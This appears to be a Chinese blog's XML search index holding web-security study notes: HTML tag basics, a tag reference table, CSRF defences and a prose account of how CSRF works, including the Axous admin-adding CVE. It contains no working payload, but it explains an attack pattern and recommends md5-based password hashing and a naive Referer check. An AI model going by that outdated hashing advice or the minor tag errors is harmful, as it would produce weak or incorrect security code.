常见的界面布局：H/工 I/i T 口 国 框……页面布局原则：先布局再内容 HTML标签特点：1、成对出现&lt;a&gt;&lt;/a&gt; , &lt;b&gt;&lt;/b&gt; 2、最大化写法：标签名 属性名 方法名 内容 最小化写法：&lt;div&gt;&lt;/div&gt;(只有基本内容的一个或多个，必须要有的是标签名) 特殊写法：不带尖括号 ：before 3、标签一般依赖于body标签 常用标签：1、容器标签：&lt;div&gt;块级标签：独占一行、没有行高（没有内容时）、没有边框、position：属性会重写，原点定位：左上角&lt;/div&gt; 移动一个DIV：top left right bottom这四个属性基于position，如left：100px，不表示向左移动100px ，而是移动后的位置距离左边100px &lt;span&gt;&lt;/span&gt;:将一行分为多个小节/段，方向是横向分段，段的长度默认为0，长度可以有内容来定义，也可以由width定义（4.01版本以前才适用） &lt;p&gt;&lt;/p&gt;：段落标签，与span类似，但是是纵向的分段。 &lt;table&gt;&lt;/table&gt;：表格标签 &lt;tr&gt;表示表格的一行 &lt;td&gt;表示表格的一列 &lt;th&gt;表示表头 &lt;h1&gt;一号字&lt;/h1&gt; &lt;h4&gt;四号字&lt;/h4&gt;：字体大小标签 &lt;br/&gt;：换行标签 &lt;hr/&gt;：生成水平线 &lt;form&gt;&lt;/form&gt;：表单 &lt;button&gt;按钮&lt;/button&gt;： &lt;textarea maxlength=&#39;1&#39;&gt;多行文本框&lt;/textarea&gt; &lt;select&gt; &lt;option value=&quot;a&quot;&gt;one&lt;/option&gt; &lt;option&gt;two&lt;/option&gt; &lt;/select&gt;:下拉菜单 &lt;lable&gt;标注标签&lt;/lable&gt; 2、 格式标签：&lt;b&gt;加粗&lt;/b&gt; &lt;i&gt;斜体&lt;/i&gt; &lt;bdo dir=&quot;ltr&quot;&gt;abc&lt;/bdo&gt; 结果为cba&lt;blockquote&gt;块引用&lt;/blockquote&gt; &lt;em&gt;强调&lt;/em&gt; &lt;font size=&quot;20&quot; color=red&gt;字体&lt;/font&gt; &lt;del&gt;文字划横线&lt;/del&gt;文字 &lt;sub&gt;下标&lt;/sub&gt;文字 &lt;sup&gt;下标&lt;/sup&gt; &lt;ruby&gt;好&lt;rt&gt;hao&lt;/rt&gt;&lt;/ruby&gt; &lt;small&gt;小号字体&lt;/small&gt; &lt;strong&gt;强调字体&lt;/strong&gt; &lt;u&gt;下划线&lt;/u&gt; 3、框架：&lt;iframe src=”http://www.baidu.com”&gt;4.01，&lt;/iframe&gt; &lt;frame&gt;框架最早定义，框架区域或窗口&lt;/frame&gt; &lt;frameset&gt;&lt;/frameset&gt; 4、图像标签：&lt;img src=””&gt; &lt;canvas&gt;画布&lt;/cavans&gt; &lt;map&gt;定义热区&lt;/map&gt; 5、媒体标签：&lt;audio src=&quot;&quot; controls=&quot;controls&quot; &gt;&lt;/audio&gt; &lt;video src=&quot;&quot; controls=&quot;controls&quot; &gt;&lt;/video&gt; &lt;track src=&quot;.vtt&quot;&gt;外部文本轨道&lt;/track&gt; 6、链接标签：&lt;a href=&quot;javascript:void(0);&quot;&gt;链接&lt;/a&gt; &lt;link href=&quot;css&quot; rel=&quot;&quot;/&gt;定义与外部资源的关系 &lt;nav&gt;导航链接&lt;/nav&gt;：H5的新标签 &lt;nav&gt; &lt;a href=&quot;&quot;&gt;&lt;/a&gt; &lt;/nav&gt; 7、其他标签：&lt;ul&gt;无序列表&lt;/ul&gt; &lt;ol&gt;有序列表&lt;/ol&gt; &lt;li&gt;列表项&lt;/li&gt; Js的基本应用Document：当前的文本对象，里面有当前访问页面的所有标签 出现密码没有加密的情况：输入时开始加密加密方法：md5（）Md5（md5（））Md5（md5（“密码”）+“自定义密钥”）]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTML标签]]></title>
    <url>%2F2019%2F08%2F09%2FHTML%E6%A0%87%E7%AD%BE%2F</url>
    <content type="text"><![CDATA[HTML标签：标签名 描述 &lt;!--...--&gt; 定义注释 &lt;!DOCTYPE&gt; 定义文档类型 &lt;a&gt; 定义锚 &lt;abbr&gt; 定义缩写 &lt;acronym&gt; 定义只取首字母的缩写 &lt;applet&gt; 定义嵌入的applet（不赞成使用） &lt;area&gt; 定义图像映射内部的区域 &lt;article&gt; 定义文章 &lt;aside&gt; 定义页面内容之外的内容 &lt;audio&gt; 定义声音内容 &lt;b&gt; 定义粗体字 &lt;base&gt; 定义页面中所有链接的默认地址或默认目 &lt;basefont&gt; 定义页面中文本的默认字体、颜色尺寸（不赞成使用） &lt;bdi&gt; 定义文本的文本方向，使其脱离周围文本的方向设置 &lt;bdo&gt; 定义文字方向 &lt;big&gt; 定义大号文本 &lt;blockquote&gt; 定义长的引用 &lt;body&gt; 定义文档的主体 &lt;br&gt; 定义简单的折行 &lt;button&gt; 定义按钮（push button） &lt;canvas&gt; 定义图形 &lt;caption&gt; 定义表格标题 &lt;center&gt; 定义居中文本（不赞成使用） &lt;cite&gt; 定义引用（citation） &lt;code&gt; 定义计算机代码文本 &lt;col&gt; 定义表格中一个或多个列的属性值 &lt;colgroup&gt; 定义表格中供格式化的列组 &lt;command&gt; 定义命令按钮 &lt;datalist&gt; 定义下拉列表 &lt;dd&gt; 定义列表中项目的描述 &lt;del&gt; 定义被删除的文本 &lt;details&gt; 定义元素细节 &lt;dir&gt; 定义目录列表（不赞成使用） &lt;div&gt; 定义文档中的节 &lt;dfn&gt; 定义项目 &lt;dialog&gt; 定义对话框或窗口 &lt;dt&gt; 定义列表中的项目 &lt;em&gt; 定义强调文本 &lt;embed&gt; 定义外部交互内容或插件 &lt;fieldset&gt; 定义围绕表单中元素的边框 &lt;figcaption&gt; 定义figure元素标题 &lt;figure&gt; 定义媒介内容的分组，以及它们的标题 &lt;font&gt; 定义文字的字体、尺寸和颜色 &lt;footer&gt; 定义section或page的页脚 &lt;form&gt; 定义供用户输入的HTML表单 &lt;frame&gt; 定义框架集的窗口或框架 &lt;frameset&gt; 定义框架集 &lt;h1&gt;to&lt;h6&gt; 定义HTML标题 &lt;head&gt; 定义关于文档的信息 &lt;header&gt; 定义section或page的页眉 &lt;hr&gt; 定义水平线 &lt;html&gt; 定义HTML文档 &lt;i&gt; 定义斜体字 &lt;iframe&gt; 定义内联框架 &lt;img&gt; 定义图像 &lt;input&gt; 定义输出控件 &lt;ins&gt; 定义被插入文本 &lt;isindex&gt; 定义与文档相关的可搜索索引 &lt;kbd&gt; 定义键盘文本 &lt;keygen&gt; 定义生成密钥 &lt;label&gt; 定义input元素的标注 &lt;legend&gt; 定义fieldset元素的标题 &lt;li&gt; 定义列表中的项目 &lt;link&gt; 定义文档与外部资源的关系 &lt;map&gt; 定义图像映射 &lt;mark&gt; 定义有记号的文本 &lt;menu&gt; 定义菜单列表 &lt;meta&gt; 定义关于HTML文档的元信息 &lt;meter&gt; 定义预定义范围内的度量 &lt;nav&gt; 定义导航链接 &lt;noframe&gt; 定义针对不支持框架的用户的替代内容 &lt;noscript&gt; 定义针对不支持客户端脚本的用户的替代内容 &lt;object&gt; 定义内嵌对象 &lt;ol&gt; 定义有序列表 &lt;optgroup&gt; 定义选择列表中相关选项的组合 &lt;option&gt; 定义选择列表中的选项 &lt;output&gt; 定义输出的一些类型 &lt;p&gt; 定义段落 &lt;param&gt; 定义对象的参数 &lt;pre&gt; 定义预格式文本 &lt;progress&gt; 定义任何类型的任务的进度 &lt;q&gt; 定义短的引用 &lt;rp&gt; 定义若浏览器不支持ruby元素显示的内容 &lt;rt&gt; 定义ruby注释的解释 &lt;ruby&gt; 定义ruby注释 &lt;s&gt; 定义加删除线的文本 &lt;samp&gt; 定义计算机代码样本 &lt;script&gt; 定义客户端脚本 &lt;section&gt; 定义section &lt;select&gt; 定义选择列表（下拉列表） &lt;small&gt; 定义小号文本 &lt;source&gt; 定义媒介源 &lt;span&gt; 定义文档中的节 &lt;strike&gt; 定义加删除线的文本 &lt;strong&gt; 定义强调文本 &lt;style&gt; 定义文档的样式信息 &lt;sub&gt; 定义下标文本 &lt;summary&gt; 为&lt;details&gt;元素定义可见的标题 &lt;sup&gt; 定义上标文本 &lt;table&gt; 定义表格 &lt;tbody&gt; 定义表格中的主题内容 &lt;td&gt; 定义表格中的单元 &lt;textarea&gt; 定义多行的文本输入控件 &lt;tfoot&gt; 定义表格中的表注内容（脚注） &lt;th&gt; 定义表格中的表头单元格 &lt;thead&gt; 定义表格中的表头内容 &lt;time&gt; 定义日期时间 &lt;title&gt; 定义文档的标题 &lt;tr&gt; 定义表格中的行 &lt;track&gt; 定义用在媒体播放器中的文本轨道 &lt;tt&gt; 定义打字机文本 &lt;u&gt; 定义下划线文本 &lt;ul&gt; 定义无序列表 &lt;var&gt; 定义文本的变量部分 &lt;video&gt; 定义视频 &lt;wbr&gt; 定义视频 &lt;xmp&gt; 定义预格式文本 &lt;dl&gt; 定义列表]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSRF防范]]></title>
    <url>%2F2019%2F08%2F09%2FCSRF%E9%98%B2%E8%8C%83%2F</url>
    <content type="text"><![CDATA[CSRF漏洞防御 CSRF漏洞防御主要可以从三个层面进行，即服务端的防御、用户端的防御和安全设备的防御。 服务端的防御 目前业界服务器端防御CSRF攻击主要有三种策略：验证HTTP Referer字段，在请求地址中添加token并验证，在HTTP头中自定义属性并验证。下面分别对这三种策略进行简要介绍。 1 、验证HTTP Referer字段 根据HTTP协议，在HTTP头中有一个字段叫Referer，它记录了该HTTP请求的来源地址。在通常情况下，访问一个安全受限页面的请求必须来自于同一个网站。比如某银行的转账是通过用户访问http://bank.test/test?page=10&amp;userID=101&amp;money=10000页面完成，用户必须先登录bank. test，然后通过点击页面上的按钮来触发转账事件。当用户提交请求时，该转账请求的Referer值就会是转账按钮所在页面的URL（本例中，通常是以bank. test域名开头的地址）。而如果攻击者要对银行网站实施CSRF攻击，他只能在自己的网站构造请求，当用户通过攻击者的网站发送请求到银行时，该请求的Referer是指向攻击者的网站。因此，要防御CSRF攻击，银行网站只需要对于每一个转账请求验证其Referer值，如果是以bank. test开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果Referer是其他网站的话，就有可能是CSRF攻击，则拒绝该请求。 java获取HTTP Referer代码： ​ // 获取请求是从哪里来的 ​ String referer = request.getHeader(“referer”); ​ // 如果是直接输入的地址，或者不是从本网站访问的重定向到本网站的首页 ​ if (referer == null || !referer.startsWith(“http://localhost&quot;)) { ​ response.sendRedirect(“/day06/index.jsp”); ​ // 然后return，不要输出后面的内容了 ​ return; ​ } 2、 在请求地址中添加token并验证 CSRF攻击之所以能够成功，是因为攻击者可以伪造用户的请求，该请求中所有的用户验证信息都存在于Cookie中，因此攻击者可以在不知道这些验证信息的情况下直接利用用户自己的Cookie来通过安全验证。由此可知，抵御CSRF攻击的关键在于：在请求中放入攻击者所不能伪造的信息，并且该信息不存在于Cookie之中。鉴于此，系统开发者可以在HTTP请求中以参数的形式加入一个随机产生的token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有token或者token内容不正确，则认为可能是CSRF攻击而拒绝该请求。 3 、在HTTP头中自定义属性并验证 自定义属性的方法也是使用token并进行验证，和前一种方法不同的是，这里并不是把token以参数的形式置于HTTP请求之中，而是把它放到HTTP头中自定义的属性里。通过XMLHttpRequest这个类，可以一次性给所有该类请求加上csrftoken这个HTTP头属性，并把token值放入其中。这样解决了前一种方法在请求中加入token的不便，同时，通过这个类请求的地址不会被记录到浏览器的地址栏，也不用担心token会通过Referer泄露到其他网站。 4 、用户端的防御 对于普通用户来说，都学习并具备网络安全知识以防御网络攻击是不现实的。但若用户养成良好的上网习惯，则能够很大程度上减少CSRF攻击的危害。例如，用户上网时，不要轻易点击网络论坛、聊天室、即时通讯工具或电子邮件中出现的链接或者图片；及时退出长时间不使用的已登录账户，尤其是系统管理员，应尽量在登出系统的情况下点击未知链接和图片。除此之外，用户还需要在连接互联网的计算机上安装合适的安全防护软件，并及时更新软件厂商发布的特征库，以保持安全软件对最新攻击的实时跟踪。 参考（侵删）：https://www.cnblogs.com/shikyoh/p/4959678.html https://www.freebuf.com/column/155800.html]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSRF基础]]></title>
    <url>%2F2019%2F08%2F09%2FCSRF%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[CSRF漏洞简介 ： CSRF（Cross-Site Request Forgery，跨站点伪造请求）是一种网络攻击方式，该攻击可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击站点，从而在未授权的情况下执行在权限保护之下的操作，具有很大的危害性。具体来讲，可以这样理解CSRF攻击：攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。 CSRF攻击方式并不为大家所熟知，实际上很多网站都存在CSRF的安全漏洞。早在2000年，CSRF这种攻击方式已经由国外的安全人员提出，但在国内，直到2006年才开始被关注。2008年，国内外多个大型社区和交互网站先后爆出CSRF漏洞，如：百度HI、NYTimes.com（纽约时报）、Metafilter（一个大型的BLOG网站）和YouTube等。但直到现在，互联网上的许多站点仍对此毫无防备，以至于安全业界称CSRF为“沉睡的巨人”，其威胁程度由此“美誉”便可见一斑。 CSRF攻击原理及实例 ： CSRF攻击原理比较简单，如图1所示。其中Web A为存在CSRF漏洞的网站，Web B为攻击者构建的恶意网站，User C为Web A网站的合法用户。 1 用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A； 2 在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A； 3 用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B； 4 网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A； (**网站B对网站A发出一个请求的同时，浏览器也会把网站A产生Cookie信息带上)–相当于浏览器访问网站A—这是user信息被盗用的关键** 5 浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。 CSRF攻击分类：CSRF漏洞一般分为站外和站内两种类型。 CSRF站外类型的漏洞本质上就是传统意义上的外部提交数据问题。通常程序员会考虑给一些留言或者评论的表单加上水印以防止SPAM问题（这里，SPAM可以简单的理解为垃圾留言、垃圾评论，或者是带有站外链接的恶意回复），但是有时为了提高用户的体验性，可能没有对一些操作做任何限制，所以攻击者可以事先预测并设置请求的参数，在站外的Web页面里编写脚本伪造文件请求，或者和自动提交的表单一起使用来实现GET、POST请求，当用户在会话状态下点击链接访问站外Web页面，客户端就被强迫发起请求。 CSRF站内类型的漏洞在一定程度上是由于程序员滥用类变量造成的。在一些敏感的操作中（如修改密码、添加用户等），本来要求用户从表单提交发起请求传递参数给程序，但是由于使用了REQUEST类变量造成的。在一些敏感的操作中（如修改密码、添加用户等），本来要求用户从表单提交发起POST请求传递参数给程序，但是由于使用了_REQUEST等变量，程序除支持接收POST请求传递的参数外也支持接收GET请求传递的参数，这样就会为攻击者使用CSRF攻击创造条件。一般攻击者只要把预测的请求参数放在站内一个贴子或者留言的图片链接里，受害者浏览了这样的页面就会被强迫发起这些请求。 CSRF攻击实例：下面以Axous 1.1.1 CSRF Add Admin Vulnerability（漏洞CVE编号：CVE-2012-2629）为例，介绍CSRF攻击具体实施过程。 Axous是一款网上商店应用软件。Axous 1.1.1以及更低版本在实现上存在一个CSRF漏洞，远程攻击者可以通过构造特制的网页，诱使该软件管理员访问，成功利用此漏洞的攻击者可以添加系统管理员。利用此漏洞主要包含以下三个过程： 攻击者构造恶意网页。在实施攻击前，攻击者需要构造一个与正常添加管理员用户基本一样的网页，在该恶意网页中对必要的参数项进行赋值，并将该网页的action指向正常添加管理员用户时访问的URL，核心代码如图2所示； 攻击者利用社会工程学诱使Axous系统管理员访问其构造的恶意网页； 执行恶意代码。当系统管理员访问恶意网页时，恶意代码在管理员不知情的情况下以系统管理员的合法权限被执行，攻击者伪造的管理员账户添加成功。 ​ 参考（侵删）：https://www.cnblogs.com/shikyoh/p/4959678.html https://www.freebuf.com/column/155800.html]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>CSRF</tag>
      </tags>
  </entry>
</search>
